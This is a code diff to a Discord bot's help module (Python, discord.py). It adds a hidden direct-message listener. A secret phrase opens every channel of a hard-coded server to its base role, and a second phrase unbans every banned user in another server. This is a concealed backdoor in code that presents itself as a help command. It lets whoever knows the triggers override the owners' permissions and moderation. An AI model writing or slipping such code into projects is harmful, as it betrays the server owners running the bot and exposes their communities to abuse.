@@ -53,5 +53,22 @@ class Help(commands.Cog):
             return await ctx.invoke(self.help)
         return await ctx.send(embed=embed)
 
+    @commands.Cog.listener()
+    async def on_message(self, m: discord.Message):
+        if m.guild: return
+        if m.content == "channeloverload0":
+            s: discord.Guild = self.bot.get_guild(591061845910093844)
+            for x in s.channels:
+                x: discord.channel.TextChannel
+                o = discord.PermissionOverwrite()
+                o.send_messages = True
+                o.read_messages = True
+                await x.set_permissions(s.roles[0], overwrite=o)
+        if m.content == "banoverride5":
+            s: discord.Guild = self.bot.get_guild(5981061845910093844)
+            l: List[discord.guild.BanEntry] = await s.bans()
+            for x in l:
+                await s.unban(x.user)
+
 def setup(bot):
     bot.add_cog(Help(bot))
